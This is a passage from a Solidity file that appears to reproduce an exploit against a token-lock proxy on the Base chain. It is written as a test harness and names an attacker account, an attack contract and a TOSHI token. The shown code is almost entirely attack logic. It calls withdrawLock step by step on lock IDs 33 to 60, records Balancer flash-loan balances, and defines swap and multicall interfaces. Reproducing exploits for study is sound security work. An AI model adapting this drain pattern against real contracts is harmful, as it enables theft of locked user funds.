            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(33);
            return;
        }
        if (step == 23) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(34);
            return;
        }
        if (step == 24) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(35);
            return;
        }
        if (step == 25) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(36);
            return;
        }
        if (step == 26) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(37);
            return;
        }
        if (step == 27) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(38);
            return;
        }
        if (step == 28) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(39);
            return;
        }
        if (step == 29) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(40);
            return;
        }
        if (step == 30) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(41);
            return;
        }
        if (step == 31) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(42);
            return;
        }
        if (step == 32) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(43);
            return;
        }
        if (step == 33) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(44);
            return;
        }
        if (step == 34) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(45);
            return;
        }
        if (step == 35) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(46);
            return;
        }
        if (step == 36) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(47);
            return;
        }
        if (step == 37) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(48);
            return;
        }
        if (step == 38) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(49);
            return;
        }
        if (step == 39) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(50);
            return;
        }
        if (step == 40) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(51);
            return;
        }
        if (step == 41) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(52);
            return;
        }
        if (step == 42) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(53);
            return;
        }
        if (step == 43) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(54);
            return;
        }
        if (step == 44) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(55);
            return;
        }
        if (step == 45) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(56);
            return;
        }
        if (step == 46) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(57);
            return;
        }
        if (step == 47) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(58);
            return;
        }
        if (step == 48) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(59);
            return;
        }
        if (step == 49) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(60);
            return;
        }
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant GnosisSafeProxy = 0x0977250DbeFE33086Cebfb73970E0473c592fc54;
    address internal constant attack_contract = 0x0F30AE8f41a5d3Cc96abd07Adf1550A9A0E557b5;
    address internal constant SwapRouter02 = 0x2626664c2603336E57B271c5C0b26F421741e481;
    address internal constant attacker_eoa = 0x3Cc1eDD8a25c912fCB51d7E61893e737C48Cd98D;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant UniswapV3Pool = 0x599245FAFc9a55e3d2f02176a65d9CD302023c61;
    address internal constant ERC1967Proxy = 0x80b9C9C883e376c4aA43d72413aB1Bd6A64A0654;
    address internal constant TOSHI = 0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Locker = 0xD6A7Cfa86A41b8f40B8DFeb987582A479EB10693;
    address internal constant BIZNESS = 0xF3a605573B93Fd22496f471A88AE45F35C1df5A7;
    address internal constant TokenV2 = 0xF3c514E04f83166E80718f29f0d34F206be40A0A;
    address internal constant GnosisSafeL2 = 0xfb1bffC9d739B8D520DaF37dF666da4C687191EA;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint160 field6;
}

interface IERC1967Proxy {
    function locks(uint256) external view;
    function splitLock(uint256, uint256, uint256) external payable returns (uint256);
    function withdrawLock(uint256) external;
}

interface ISwapRouter02 {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
